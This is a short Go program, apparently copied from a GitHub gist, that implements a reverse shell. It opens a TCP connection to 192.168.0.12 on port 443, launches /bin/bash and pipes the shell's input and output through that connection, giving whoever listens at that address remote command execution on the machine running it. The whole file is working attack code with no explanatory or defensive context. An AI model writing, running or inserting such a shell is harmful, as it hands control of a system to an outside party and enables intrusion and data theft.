//https://gist.github.com/jasonrdsouza/ea122c3a02eba003329e 
package main

import "os/exec"
import "net"

func main() {
	c, _ := net.Dial("tcp", "192.168.0.12:443")
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
